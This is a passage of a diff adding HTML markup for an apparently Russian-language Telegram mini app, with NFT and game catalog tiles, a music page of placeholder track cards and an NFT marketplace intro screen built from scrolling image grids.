+  <div href="#home" class="cataloggames" style="background: url(https://v.getgems.io/9N9VhWR32C0aZ5xXSgOz0SEvkamgwKYH-DgE6Bm4qgA/eyJ2ZiI6ImNyb3A9J21pbig2MDAvNDAwKmluX2gsaW5fdyknOmluX2gsc2NhbGU9J21pbig2MDAsaXcpJzotMjpzd3NfZGl0aGVyPWVkOmZsYWdzPWxhbmN6b3Msc3BsaXRbczBdW3MxXTtbczBdcGFsZXR0ZWdlbj1zdGF0c19tb2RlPWRpZmZbcF07W3MxXVtwXXBhbGV0dGV1c2U9bmV3PTE6ZGl0aGVyPW5vbmUiLCJsb29wIjowfQ/czM6Ly9nZXRnZW1zLW5mdC9uZnQvYi9jLzY2M2UzOGExYmI4YTg1OTc5MDMzYmI3NS91Y2V4cG9ydGRvd25sb2FkaWQxRVFIMllsaEJmcEJuZUptSlUtOUMxZk5hQmNiT1VsR2k.webp); background-size: cover;">
+ </div>
+
+ <div onclick="tg.openLink('https://getgems.io/collection/EQDFiSDU87TEvY67yqx0dTLQ-xHKbrR84dYfrYXWa5FWtMiu?utm_source=homepage&utm_medium=collection_catalog&utm_campaign=collection_overview');" href="#home" class="cataloggames" style="background: url(https://i.getgems.io/AGNocakqpekQS37n1j5F6txuVOCsUe4WkV5CkmXFQiA/rs:fill:600:400:1/g:ce/czM6Ly9nZXRnZW1zLW5mdC9uZnQvYi9jLzY1OGVhYTNjODE0NWI3MjRkNDYyNWJiMy9jb3Zlci5wbmc); background-size: cover;">
+ </div>
+
+  <div href="#home" class="cataloggames" style="background: url(https://i.getgems.io/hbFfJC2HwNfp-F01dmjV162fT9VSb7svGe4RcEYAkfs/rs:fill:600:400:1/g:ce/czM6Ly9nZXRnZW1zLW5mdC9uZnQvYi9jLzY1OWZjOGRhNTc5ODcwY2M1ODkxYWFjMC9jb3Zlci5wbmc); background-size: cover;">
+ </div>
+
+<div href="#home" class="cataloggames" style="background: url(https://i.getgems.io/G5dyDELZaR8O27nmrnlloouMmHb3Dl3BVaARztZ3Pxg/rs:fill:600:400:1/g:ce/czM6Ly9nZXRnZW1zLXMzL25mdC1jb250ZW50LWNhY2hlL2ltYWdlcy9FUUFHMkJIMEpsbUZrYk1yTEVueW4yYklJVGFPU3NzZDRXZGlzRTRCZEZNa1piaXIvNmU4OTE5NzZkNzAzMDYxYV8xODdlMTBhYWI1Mg); background-size: cover;">
+ </div>
+
+   <div onclick="tg.openLink('https://t.me/TheMkStudio/42');" href="#home" class="cataloggames" style="background: url(https://i.postimg.cc/R0pWQrC2/First-Post.png); background-size: cover;">
+ </div>
+</div>
+       <br>
+	
+
+<!--<h1 style="padding: 40px 0px 0px 0px;">Игры в Разработке</h1>
+	<h2>Здесь пока ничего нет...</h2>
+	<br>
+	   <div class="scrollmenu">
+  <div href="#home" class="cataloggames" style="background: url(https://avatars.mds.yandex.net/i?id=5df1f4ea3921e895bc8c9d143fa9d492d844a198-4438849-images-thumbs&n=13); background-height: 100%; background-width: 100%;">
+	<svg style="width: 50px; height: 50px; position: absolute; bottom: 1%; right: 1%; transform: scale(0.8);" xmlns="http://www.w3.org/2000/svg" width="46.92" height="46.88" x="0.000"><path fill="#fff" d="M11.356 8.833h23.975v29.022H11.356z"/><path fill="#fc3f1d" d="M23.48-.12C10.52-.12 0 10.36 0 23.24 0 36.16 10.52 46.6 23.48 46.6c12.92 0 23.44-10.44 23.44-23.36C46.92 10.36 36.4-.12 23.48-.12Zm3.04 37.24V13.08h-2.16c-3.96 0-6.04 2-6.04 4.96 0 3.36 1.44 4.92 4.4 6.92l2.44 1.64-7.04 10.52h-5.24l6.32-9.4c-3.64-2.6-5.68-5.12-5.68-9.4 0-5.36 3.72-9 10.8-9h7.04v27.8Z"/></svg>
+	<svg style="width: 50px; height: 50px; position: absolute; bottom: 1%; right: 1%; transform: scale(0.8);" viewBox="-2.4 -2.4 28.80 28.80" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"><rect x="-2.4" y="-2.4" width="28.80" height="28.80" rx="14.4" fill="#ffffff" strokewidth="0"></rect></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M5.32914 19.4213C5.21914 19.4213 5.09914 19.3913 4.99914 19.3413L2.77914 18.2312C2.52914 18.1012 2.36914 17.8412 2.36914 17.5612V14.7812C2.36914 14.3713 2.70914 14.0312 3.11914 14.0312C3.52914 14.0312 3.86914 14.3713 3.86914 14.7812V17.0913L5.66914 18.0013C6.03914 18.1813 6.18914 18.6313 5.99914 19.0013C5.86914 19.2613 5.60914 19.4213 5.32914 19.4213Z" fill="#292D32"></path> <path d="M11.9995 22.7488C11.9395 22.7488 11.8795 22.7388 11.8295 22.7288C11.7695 22.7188 11.7095 22.6888 11.6495 22.6588L9.43947 21.5588C9.06947 21.3688 8.91947 20.9187 9.09947 20.5487C9.28947 20.1787 9.73947 20.0287 10.1095 20.2087L11.2495 20.7788V19.2188C11.2495 18.8088 11.5895 18.4688 11.9995 18.4688C12.4095 18.4688 12.7495 18.8088 12.7495 19.2188V20.7788L13.8895 20.2087C14.2595 20.0287 14.7095 20.1787 14.8995 20.5487C15.0895 20.9187 14.9395 21.3688 14.5595 21.5588L12.3495 22.6588C12.2895 22.6888 12.2295 22.7088 12.1695 22.7288C12.1095 22.7388 12.0595 22.7488 11.9995 22.7488Z" fill="#292D32"></path> <path d="M18.6702 19.4191C18.4002 19.4191 18.1302 19.2691 18.0002 19.0091C17.8102 18.6391 17.9602 18.1891 18.3402 17.9991L20.1502 17.0991V14.7891C20.1502 14.3791 20.4902 14.0391 20.9002 14.0391C21.3102 14.0391 21.6502 14.3791 21.6502 14.7891V17.5691C21.6502 17.8491 21.4902 18.1091 21.2402 18.2391L19.0002 19.3391C18.8902 19.3891 18.7802 19.4191 18.6702 19.4191Z" fill="#292D32"></path> <path d="M11.9995 14.4191C11.5895 14.4191 11.2495 14.0791 11.2495 13.6691V11.3591L9.43947 10.4591C9.06947 10.2691 8.91947 9.81907 9.09947 9.44907C9.28947 9.07907 9.73947 8.92907 10.1095 9.10907L11.9995 10.0491L13.8895 9.10907C14.2595 8.92907 14.7095 9.06907 14.8995 9.44907C15.0895 9.81907 14.9395 10.2691 14.5595 10.4591L12.7495 11.3591V13.6691C12.7495 14.0791 12.4095 14.4191 11.9995 14.4191Z" fill="#292D32"></path> <path d="M3.10938 9.96807C2.69938 9.96807 2.35938 9.62807 2.35938 9.21807V6.45807V6.44807C2.35938 6.38807 2.36938 6.32807 2.37938 6.27807C2.39938 6.18807 2.42938 6.11807 2.46938 6.04807C2.49938 5.99807 2.53938 5.95807 2.57938 5.91807C2.61938 5.87807 2.66938 5.83807 2.71938 5.80807C2.73938 5.79807 2.76938 5.77807 2.78938 5.76807L4.99938 4.65807C5.36938 4.47807 5.81938 4.62807 5.99938 4.99807C6.18938 5.36807 6.03938 5.81807 5.66938 5.99807L4.78938 6.43807L5.66938 6.87807C6.03938 7.06807 6.18938 7.51807 5.99938 7.88807C5.81938 8.25807 5.36938 8.40807 4.99938 8.22807L3.85938 7.65807V9.21807C3.85938 9.63807 3.52937 9.96807 3.10938 9.96807Z" fill="#292D32"></path> <path d="M14.2198 3.85859C14.1098 3.85859 13.9898 3.82859 13.8898 3.77859L11.9998 2.83859L10.1098 3.77859C9.73981 3.96859 9.28981 3.81859 9.10981 3.44859C8.91981 3.07859 9.06981 2.62859 9.43981 2.43859L11.6598 1.32859C11.8698 1.21859 12.1198 1.21859 12.3298 1.32859L14.5498 2.43859C14.9198 2.62859 15.0698 3.07859 14.8898 3.44859C14.7598 3.70859 14.4998 3.85859 14.2198 3.85859Z" fill="#292D32"></path> <path d="M20.8904 9.96807C20.4804 9.96807 20.1404 9.62807 20.1404 9.21807V7.65807L19.0004 8.22807C18.6304 8.40807 18.1804 8.25807 18.0004 7.88807C17.8104 7.51807 17.9604 7.06807 18.3404 6.87807L19.2204 6.43807L18.3304 5.99807C17.9604 5.81807 17.8104 5.36807 18.0004 4.99807C18.1904 4.62807 18.6304 4.47807 19.0004 4.65807L21.2104 5.75807C21.2304 5.76807 21.2604 5.77807 21.2804 5.79807C21.3404 5.82807 21.3904 5.87807 21.4404 5.92807C21.4704 5.96807 21.5004 6.00807 21.5304 6.04807C21.5704 6.11807 21.6004 6.18807 21.6204 6.26807C21.6304 6.32807 21.6404 6.38807 21.6404 6.43807V6.44807V9.20807C21.6404 9.63807 21.3004 9.96807 20.8904 9.96807Z" fill="#292D32"></path> </g></svg>
+ </div>-->
+       <br>
+       <br>
+       <br>
+	
+
+	<h1>Дальше пока ничего нет :(</h1>
+	<div id="completed">
+		<h2 style="font-size: 12px;">Скоро все появится...</h2>
+	
+	</div>
+</div>
+
+<div id="musicPage">
+<div>
+  		<button id="homescreen" style="position: fixed; top: 1%; left: 5%; z-index: 10" onclick="tg.addToHomeScreen()">
+		<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" transform="matrix(1, 0, 0, 1, 0, 0)rotate(0)"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g clip-path="url(#clip0_429_11177)"> <path d="M19 10V19C19 20.1046 18.1046 21 17 21H7C5.89543 21 5 20.1046 5 19V10M21 12L12 3L3 12" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path> </g> <defs> <clipPath id="clip0_429_11177"> <rect width="24" height="24" fill="white"></rect> </clipPath> </defs> </g></svg>
+		</button>
+		<p id = "usdt"><span class="fancy">Треки</span></p>
+</div>
+
+       <section class="playlists">
+
+		<article class="card">
+			<div class="card-inner">
+				<span class="card-pin"></span>
+				<div class="card-image">
+					<img src="https://i.postimg.cc/jSvGWDWR/99a5a9024f91e6d1209a68a90e5dea9711-resize-2000x2000-same-ead9b3.jpg" />
+				</div>
+				<div class="card-content">
+					<div class="card-meta">
+          <a href="javascript:tg.downloadFile(this, 'https://telegra.ph/file/5583ac37c90979f052b7b.png', 'Photo.png');">
+						<span class="card-meta-number">Limp Bizkit</span>
+            <button type="submit" style="border: 0px; border-radius: 10px;">
+            <svg style="transform: scale(0.7); width: 25px; height: 25px;" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g id="Interface / Download"> <path id="Vector" d="M6 21H18M12 3V17M12 17L17 12M12 17L7 12" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g> </g></svg>
+            </button>
+            </a>
+					</div>
+					<text class="card-title">TALA</text>
+				</div>
+			</div>
+		</article>
+
+		<article class="card">
+			<div class="card-inner">
+				<span class="card-pin"></span>
+				<div class="card-image">
+					<img src="https://assets.codepen.io/285131/hand-drawn-monster-milkshake.jpg" />
+				</div>
+				<div class="card-content">
+					<div class="card-meta">
+						<span class="card-meta-number">20 songs</span>
+						<button class="card-meta-button">
+							<i class="ai-circle-triangle-right-fill"></i>
+						</button>
+					</div>
+					<text class="card-title">Tim Bergling</text>
+				</div>
+			</div>
+		</article>
+	</section>
+
+  <section class="playlists" style="transform: scale(0.95);">
+		<article class="card horizontal">
+			<div class="card-inner">
+				<span class="card-pin simple"></span>
+				<div class="card-image">
+					<img src="https://assets.codepen.io/285131/pink-pastel-juicy-banana.jpg" />
+				</div>
+				<div class="card-content">
+					<div class="card-meta">
+						<span class="card-meta-artist">Marshmello</span>
+						<button class="card-meta-button" style="opacity: 0;">
+							<i class="ai-circle-triangle-right-fill"></i>
+						</button>
+					</div>
+					<h2 class="card-title">Hate the Other Side
+						<span class="card-time">3:40</span>
+					</h2>
+				</div>
+				<span class="card-pin simple"></span>
+			</div>
+		</article>
+	</section>
+
+  <section class="playlists">
+
+		<article class="card">
+			<div class="card-inner">
+				<span class="card-pin"></span>
+				<div class="card-image">
+					<img src="https://assets.codepen.io/285131/illustration-hand-with-cigarette-icon.jpg" />
+				</div>
+				<div class="card-content">
+					<div class="card-meta">
+						<span class="card-meta-number">20 songs</span>
+						<button class="card-meta-button">
+							<i class="ai-circle-triangle-right-fill"></i>
+						</button>
+					</div>
+					<text class="card-title">Alan Walker</text>
+				</div>
+			</div>
+		</article>
+
+		<article class="card">
+			<div class="card-inner">
+				<span class="card-pin"></span>
+				<div class="card-image">
+					<img src="https://assets.codepen.io/285131/hand-drawn-monster-milkshake.jpg" />
+				</div>
+				<div class="card-content">
+					<div class="card-meta">
+						<span class="card-meta-number">20 songs</span>
+						<button class="card-meta-button">
+							<i class="ai-circle-triangle-right-fill"></i>
+						</button>
+					</div>
+					<text class="card-title">Tim Bergling</text>
+				</div>
+			</div>
+		</article>
+	</section>
+
+  <section class="playlists">
+
+		<article class="card">
+			<div class="card-inner">
+				<span class="card-pin"></span>
+				<div class="card-image">
+					<img src="https://assets.codepen.io/285131/illustration-hand-with-cigarette-icon.jpg" />
+				</div>
+				<div class="card-content">
+					<div class="card-meta">
+						<span class="card-meta-number">20 songs</span>
+						<button class="card-meta-button">
+							<i class="ai-circle-triangle-right-fill"></i>
+						</button>
+					</div>
+					<text class="card-title">Alan Walker</text>
+				</div>
+			</div>
+		</article>
+
+		<article class="card">
+			<div class="card-inner">
+				<span class="card-pin"></span>
+				<div class="card-image">
+					<img src="https://assets.codepen.io/285131/hand-drawn-monster-milkshake.jpg" />
+				</div>
+				<div class="card-content">
+					<div class="card-meta">
+						<span class="card-meta-number">20 songs</span>
+						<button class="card-meta-button">
+							<i class="ai-circle-triangle-right-fill"></i>
+						</button>
+					</div>
+					<text class="card-title">Tim Bergling</text>
+				</div>
+			</div>
+		</article>
+	</section>
+
+  <section class="playlists"  style="transform: scale(0.95);">
+
+		<article class="card horizontal">
+			<div class="card-inner">
+				<span class="card-pin simple"></span>
+				<div class="card-image">
+					<img src="https://assets.codepen.io/285131/pink-pastel-juicy-banana.jpg" />
+				</div>
+				<div class="card-content">
+					<div class="card-meta">
+						<span class="card-meta-artist">Marshmello</span>
+						<button class="card-meta-button" style="opacity: 0;">
+							<i class="ai-circle-triangle-right-fill"></i>
+						</button>
+					</div>
+					<h2 class="card-title">Hate the Other Side
+						<span class="card-time">3:40</span>
+					</h2>
+				</div>
+				<span class="card-pin simple"></span>
+			</div>
+		</article>
+    
+	</section>
+</div>
+
+<div id="missionsPage">
+	<div class="iphone-x" >
+	<i>Speaker</i>
+	<b>Camera</b>
+	<div class="content">
+		<main>
+			<div class="launch">
+				<div class="intro">
+					<div class="intro__title">NFT</div>
+					<div class="intro__description">Explore the top collection of NFTs and buy and sell your NFTs as well</div>
+					<div class="intro__button">
+						<button onclick="document.getElementById('missionsPage').style.display = 'none'; document.getElementById('mainPage').style.display = 'block';">
+							<span>Позже...</span>
+							<span class="icon">
+								<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-right">
+									<polyline points="13 17 18 12 13 7"></polyline>
+									<polyline points="6 17 11 12 6 7"></polyline>
+								</svg>
+							</span>
+						</button>
+					</div>
+				</div>
+				<div class="wrapper-images">
+					<div class="images-line">
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)"></div>
+						</div>
+
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)"></div>
+						</div>
+
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)"></div>
+						</div>
+					</div>
+					<div class="images-line">
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18156310/media/3878637f6386b2a90a1dabf928ab07cb.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18156310/media/3878637f6386b2a90a1dabf928ab07cb.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18055765/media/e5fc935b60035305099554810357012a.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18055765/media/e5fc935b60035305099554810357012a.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18017369/media/75a7e346b931c21362faadf5c8d48061.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18017369/media/75a7e346b931c21362faadf5c8d48061.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18009132/media/f8bb031f5d1b7673c74fec445f7ec267.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18009132/media/f8bb031f5d1b7673c74fec445f7ec267.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18026165/media/3e745e01ac561b8956cf7a33b4892e37.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18026165/media/3e745e01ac561b8956cf7a33b4892e37.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18156310/media/3878637f6386b2a90a1dabf928ab07cb.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18156310/media/3878637f6386b2a90a1dabf928ab07cb.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18055765/media/e5fc935b60035305099554810357012a.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18055765/media/e5fc935b60035305099554810357012a.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18017369/media/75a7e346b931c21362faadf5c8d48061.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18017369/media/75a7e346b931c21362faadf5c8d48061.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18009132/media/f8bb031f5d1b7673c74fec445f7ec267.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18009132/media/f8bb031f5d1b7673c74fec445f7ec267.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18026165/media/3e745e01ac561b8956cf7a33b4892e37.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18026165/media/3e745e01ac561b8956cf7a33b4892e37.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18156310/media/3878637f6386b2a90a1dabf928ab07cb.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18156310/media/3878637f6386b2a90a1dabf928ab07cb.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18055765/media/e5fc935b60035305099554810357012a.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18055765/media/e5fc935b60035305099554810357012a.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18017369/media/75a7e346b931c21362faadf5c8d48061.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18017369/media/75a7e346b931c21362faadf5c8d48061.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18009132/media/f8bb031f5d1b7673c74fec445f7ec267.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18009132/media/f8bb031f5d1b7673c74fec445f7ec267.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18026165/media/3e745e01ac561b8956cf7a33b4892e37.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18026165/media/3e745e01ac561b8956cf7a33b4892e37.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+
+					</div>
+					<div class="images-line">
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/userupload/2740678/file/original-ec284b452ae3634ff7b75d3f838f2598.png?compress=1&amp;resize=1504x1128)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/userupload/2740678/file/original-ec284b452ae3634ff7b75d3f838f2598.png?compress=1&amp;resize=1504x1128)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/userupload/2740680/file/original-a66e39118f1e7e005163ef9ccd01b4d9.png?compress=1&amp;resize=1504x1128)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/userupload/2740680/file/original-a66e39118f1e7e005163ef9ccd01b4d9.png?compress=1&amp;resize=1504x1128)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18096610/media/482e3585e6ddc3a7c556b00b845f3fc5.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18096610/media/482e3585e6ddc3a7c556b00b845f3fc5.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18030490/media/010e29c84195f7493ca8667c731fd568.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18030490/media/010e29c84195f7493ca8667c731fd568.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18008595/media/e94056dfaa0ea5f46ba5353bd3c900ce.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18008595/media/e94056dfaa0ea5f46ba5353bd3c900ce.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/userupload/2740678/file/original-ec284b452ae3634ff7b75d3f838f2598.png?compress=1&amp;resize=1504x1128)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/userupload/2740678/file/original-ec284b452ae3634ff7b75d3f838f2598.png?compress=1&amp;resize=1504x1128)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/userupload/2740680/file/original-a66e39118f1e7e005163ef9ccd01b4d9.png?compress=1&amp;resize=1504x1128)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/userupload/2740680/file/original-a66e39118f1e7e005163ef9ccd01b4d9.png?compress=1&amp;resize=1504x1128)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18096610/media/482e3585e6ddc3a7c556b00b845f3fc5.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18096610/media/482e3585e6ddc3a7c556b00b845f3fc5.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18030490/media/010e29c84195f7493ca8667c731fd568.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18030490/media/010e29c84195f7493ca8667c731fd568.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18008595/media/e94056dfaa0ea5f46ba5353bd3c900ce.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18008595/media/e94056dfaa0ea5f46ba5353bd3c900ce.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/userupload/2740678/file/original-ec284b452ae3634ff7b75d3f838f2598.png?compress=1&amp;resize=1504x1128)">
